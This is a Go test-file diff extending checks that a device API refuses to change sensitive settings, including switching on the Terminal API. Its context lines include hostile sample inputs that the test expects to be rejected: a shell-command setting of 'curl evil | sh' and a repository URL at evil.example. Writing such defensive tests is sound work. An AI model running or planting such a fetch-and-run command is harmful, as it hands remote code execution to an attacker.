@@ -152,6 +152,9 @@ func TestDeviceAPIRunsOnlyAllowedMethods(t *testing.T) {
 	if responses[4].ID != 5 || responses[4].Error != nil {
 		t.Errorf("getDeviceID: %+v", responses[4])
 	}
+	if e := responses[5].Error; e == nil || !strings.Contains(e.Data, "cannot change terminal_api_enabled") {
+		t.Errorf("the device API must not switch the Terminal API on: %+v", e)
+	}
 	if e := responses[6].Error; e == nil || e.Code != -32601 {
 		t.Errorf("the device API must not create tokens: %+v", e)
 	}
@@ -178,6 +181,7 @@ func TestDeviceAPISetOsServicesSettingsAllowList(t *testing.T) {
 		`{"terminal_shell_command":"curl evil | sh"}`, `{"terminal_mux_start":"tmux"}`,
 		`{"repository_url":"https://evil.example/"}`,
 		fmt.Sprintf(`{"enabled":%v}`, !before.Enabled),
+		fmt.Sprintf(`{"terminal_api_enabled":%v}`, !before.TerminalAPIEnabled),
 		fmt.Sprintf(`{"video_enabled":%v,"files_enabled":%v}`, !before.VideoEnabled, !before.FilesEnabled),
 	} {
 		if body := set(settings); !strings.Contains(body, "the device API cannot change") {
